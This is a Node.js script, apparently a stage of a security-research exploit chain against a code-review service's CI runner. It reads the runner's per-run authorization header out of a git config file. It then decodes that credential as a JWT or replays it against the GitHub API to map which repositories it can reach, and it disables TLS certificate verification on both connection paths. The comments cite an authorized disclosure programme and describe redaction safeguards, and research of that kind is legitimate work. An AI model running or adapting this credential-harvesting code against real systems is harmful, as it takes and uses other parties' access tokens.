// rs2scope_probe.cjs - credential SCOPE INTROSPECTION helper (authorized CodeRabbit VDP, F-RUNNERSINKS-02).
// Invoked by rs2scope_rule.cjs as: node rs2scope_probe.cjs <direct|proxy> <proxyUrl|none> <gitconfigPath> <selfOwner>
//
// Budget (strict): the runner's per-run auth material is used IN MEMORY ONLY and only to
// determine its own scope:
//   step 1 - offline JWT decode (no network): if the material is a JWT, report its claims
//            (audience, issuer, subject, expiry, scope / repository list) - NO API call is made.
//   step 2 - ONLY if the material is not a JWT: exactly ONE read-only GET
//            https://api.github.com/installation/repositories?per_page=1 to determine scope.
// The material is never written to disk, never printed, never beaconed - not even partially.
// Data boundary: repository identifiers NOT owned by <selfOwner> are replaced by "<foreign>"
// in everything this process prints; a raw response body is printed verbatim ONLY when it
// contains no foreign identifiers. Any embedded token-like value is reduced to length+sha8.
"use strict";
const fs = require("fs");
const net = require("net");
const tls = require("tls");
const crypto = require("crypto");

const MODE = process.argv[2] || "proxy";
const PROXY = process.argv[3] || "none";
const CFG = process.argv[4] || "";
const SELF = process.argv[5] || "coderabbit-vdp-research4";
const HOST = "api.github.com";
const PORT = 443;
const REQPATH = "/installation/repositories?per_page=1";
const TIMEOUT_MS = 10000;

function safe(s, n) {
  const t = String(s == null ? "" : s).replace(/[^A-Za-z0-9 ._\-:,/@\[\]{}<>=]/g, "_");
  return (t || "NP").slice(0, n || 120);
}
const sha8 = (s) => crypto.createHash("sha256").update(String(s)).digest("hex").slice(0, 8);
function fp(v) { return "len=" + String(v).length + ",sha8=" + sha8(v); }
function finish(o) {
  try { process.stdout.write(JSON.stringify(o)); } catch (e) {}
  process.exit(0);
}

// ---------- load the material (in memory only) ----------
let text = "";
try { text = fs.readFileSync(CFG, "utf8"); } catch (e) { finish({ err: "CFGREAD" }); }
const raws = [];
for (const raw of text.split("\n")) {
  const m = raw.trim().match(/^extraheader\s*=\s*(.+)$/i);
  if (!m) continue;
  const v = m[1].trim().replace(/^"(.*)"$/s, "$1");
  const nm = (v.match(/^([A-Za-z0-9-]+):/) || [])[1] || "unnamed";
  raws.push({ name: nm, line: v, value: v.slice(nm.length + 1).trim() });
}
if (!raws.length) finish({ err: "NO-EXTRAHEADER" });

// ---------- step 1: offline JWT decode (no network whatsoever) ----------
function tryJwt(v) {
  const parts = v.split(".");
  if (parts.length !== 3) return null;
  const dec = (s) => {
    const t = s.replace(/-/g, "+").replace(/_/g, "/");
    return Buffer.from(t + "=".repeat((4 - (t.length % 4)) % 4), "base64").toString("utf8");
  };
  try {
    const h = JSON.parse(dec(parts[0]));
    const c = JSON.parse(dec(parts[1]));
    return { header: h, claims: c, segLens: parts.map((p) => p.length) };
  } catch (e) { return null; }
}
const SENSITIVE = /token|secret|key|password|authorization|signature|private|credential/i;
function redactClaims(c) {
  const out = { keys: Object.keys(c).sort() };
  let foreignRepos = 0, selfRepos = 0;
  for (const k of Object.keys(c)) {
    const v = c[k];
    if (SENSITIVE.test(k) && typeof v !== "number") { out[k] = "REDACTED[" + fp(v) + "]"; continue; }
    if (typeof v === "number") {
      out[k] = v;
      if (/^(exp|nbf|iat|auth_time|expires)$/i.test(k)) {
        out[k + "_iso"] = new Date(v * 1000).toISOString();
      }
      continue;
    }
    if (typeof v === "boolean" || v == null) { out[k] = v; continue; }
    if (typeof v === "string") {
      out[k] = v.length > 120 ? "REDACTED[" + fp(v) + "]" : safe(v, 120);
      continue;
    }
    if (Array.isArray(v)) {
      const mapped = v.map((item) => {
        const s = String(item);
        if (s.includes("/") && !s.startsWith(SELF + "/")) { foreignRepos++; return "<foreign>"; }
        if (s.startsWith(SELF + "/")) selfRepos++;
        return safe(s, 80);
      });
      out[k] = mapped.slice(0, 20);
      if (v.length > 20) out[k + "_count"] = v.length;
      continue;
    }
    if (typeof v === "object") {
      // object values (e.g. {repositories:[...]}) -> recurse one level, same rules
      const sub = {};
      for (const kk of Object.keys(v)) {
        const vv = v[kk];
        if (Array.isArray(vv)) {
          sub[kk] = vv.map((item) => {
            const s = typeof item === "object" ? JSON.stringify(item) : String(item);
            if ((s.includes("/") && !s.startsWith(SELF + "/")) || s.includes('"login"')) { foreignRepos++; return "<foreign>"; }
            return safe(s, 80);
          }).slice(0, 20);
        } else if (typeof vv === "string" && vv.length > 120) {
          sub[kk] = "REDACTED[" + fp(vv) + "]";
        } else {
          sub[kk] = safe(vv, 80);
        }
      }
      out[k] = sub;
      continue;
    }
    out[k] = "UNCLASSIFIED[" + fp(v) + "]";
  }
  out._foreign_repo_entries = foreignRepos;
  out._self_repo_entries = selfRepos;
  return out;
}

const j0 = tryJwt(raws[0].value);
if (j0) {
  finish({
    jwt: true,
    material: raws.map((r) => ({ name: r.name, line_fp: fp(r.line) })),
    jwt_seg_lens: j0.segLens,
    jwt_header: redactClaims(j0.header),
    jwt_claims: redactClaims(j0.claims),
    api_call_made: false,
  });
}

// ---------- step 2: the material is opaque -> exactly ONE read-only API call ----------
const extra = raws.map((r) => r.name + ": " + r.value);
const reqText = [
  "GET " + REQPATH + " HTTP/1.1",
  "Host: " + HOST,
  "User-Agent: CodeRabbit-VDP-Research",
  "Accept: application/vnd.github+json",
  "Accept-Encoding: identity",
  "X-GitHub-Api-Version: 2022-11-28",
].concat(extra).concat(["Connection: close", "", ""]).join("\r\n");

function redactBody(body) {
  const out = { body_bytes: body.length };
  let clean = true;
  try {
    const j = JSON.parse(body);
    if (typeof j.total_count === "number") out.total_count = j.total_count;
    if (Array.isArray(j.repositories)) {
      out.n_repos_in_page = j.repositories.length;
      out.repos = j.repositories.map((r) => {
        const owner = (r.owner && (r.owner.login || r.owner.name)) || "?";
        const self = owner === SELF;
        if (!self) clean = false;
        return self
          ? { full_name: safe(r.full_name, 80), private: r.private, owner_type: "self" }
          : { full_name: "<foreign>", private: r.private, owner_type: "foreign" };
      });
    }
    if (j.message) out.message = safe(j.message, 80);
    out.keys = Object.keys(j).sort();
    out.clean_no_foreign_identifiers = clean;
    if (clean) out.raw_body_verbatim = body.slice(0, 4000);
  } catch (e) {
    out.parse = "not-json";
    out.clean_no_foreign_identifiers = false;
  }
  return out;
}

let buf = Buffer.alloc(0);
let done = false;
function dechunk(s) {
  let out = "", rest = s;
  for (;;) {
    const ci = rest.indexOf("\r\n");
    if (ci < 0) break;
    const n = parseInt(rest.slice(0, ci).trim(), 16);
    if (!isFinite(n) || n <= 0) break;
    out += rest.slice(ci + 2, ci + 2 + n);
    rest = rest.slice(ci + 2 + n + 2);
  }
  return out;
}
function parseAndFinish() {
  if (done) return;
  done = true;
  clearTimeout(timer);
  const str = buf.toString("utf8");
  const i = str.indexOf("\r\n\r\n");
  if (i < 0) return finish({ jwt: false, api_call_made: true, api: { err: "NO-HTTP-RESPONSE" } });
  const head = str.slice(0, i);
  let body = str.slice(i + 4);
  if (/transfer-encoding:\s*chunked/i.test(head)) body = dechunk(body);
  if (/content-encoding:\s*gzip/i.test(head)) {
    try {
      const zlib = require("zlib");
      body = zlib.gunzipSync(Buffer.from(body, "latin1")).toString("utf8");
    } catch (e) {}
  } else if (/content-encoding:\s*(deflate|br)/i.test(head)) {
    try {
      const zlib = require("zlib");
      const b = Buffer.from(body, "latin1");
      body = (/content-encoding:\s*br/i.test(head) ? zlib.brotliDecompressSync(b) : zlib.inflateSync(b)).toString("utf8");
    } catch (e) {}
  }
  const status = parseInt((head.split("\r\n")[0].split(" ")[1]) || "0", 10) || -1;
  const hdrs = {};
  for (const l of head.split("\r\n").slice(1)) {
    const p = l.indexOf(":");
    if (p > 0) {
      const k = l.slice(0, p).trim().toLowerCase();
      const v = l.slice(p + 1).trim();
      if (["x-oauth-scopes", "x-accepted-github-permissions", "x-ratelimit-limit", "x-ratelimit-remaining",
           "x-github-request-id", "x-github-media-type", "content-type", "x-github-sso"].includes(k)) hdrs[k] = safe(v, 100);
    }
  }
  finish({ jwt: false, api_call_made: true, api: { status: status, headers: hdrs, raw_head_verbatim: head.slice(0, 2000), body: redactBody(body) } });
}
function onErr(e) {
  if (done) return;
  done = true;
  clearTimeout(timer);
  finish({ jwt: false, api_call_made: true, api: { err: safe(e && (e.code || e.message), 40) } });
}
const timer = setTimeout(parseAndFinish, TIMEOUT_MS);

function wire(socket) {
  socket.on("data", (d) => { buf = Buffer.concat([buf, d]); });
  socket.on("end", parseAndFinish);
  socket.on("close", parseAndFinish);
  socket.on("error", onErr);
  socket.write(reqText);
}
if (MODE === "direct") {
  const s = tls.connect({ host: HOST, port: PORT, servername: HOST, rejectUnauthorized: false }, function () { wire(s); });
  s.on("error", onErr);
} else {
  let purl;
  try { purl = new URL(PROXY); } catch (e) { return finish({ jwt: false, api_call_made: true, api: { err: "PROXY-URL" } }); }
  if (purl.protocol !== "http:") return finish({ jwt: false, api_call_made: true, api: { err: "PROXY-SCHEME" } });
  const s = net.connect(Number(purl.port || 80), purl.hostname, function () {
    s.write("CONNECT " + HOST + ":" + PORT + " HTTP/1.1\r\nHost: " + HOST + ":" + PORT + "\r\n\r\n");
  });
  s.on("error", onErr);
  let chead = Buffer.alloc(0), tunneled = false;
  s.on("data", function (d) {
    if (tunneled) return;
    chead = Buffer.concat([chead, d]);
    const t = chead.toString("latin1");
    const i = t.indexOf("\r\n\r\n");
    if (i < 0) return;
    const code = parseInt((t.split(" ")[1]) || "0", 10);
    if (code !== 200) {
      done = true; clearTimeout(timer);
      return finish({ jwt: false, api_call_made: true, api: { err: "PROXY-CONNECT-" + code } });
    }
    tunneled = true;
    s.removeAllListeners("data");
    s.removeAllListeners("end");
    s.removeAllListeners("close");
    const ts = tls.connect({ socket: s, servername: HOST, rejectUnauthorized: false }, function () { wire(ts); });
    ts.on("error", onErr);
  });
}
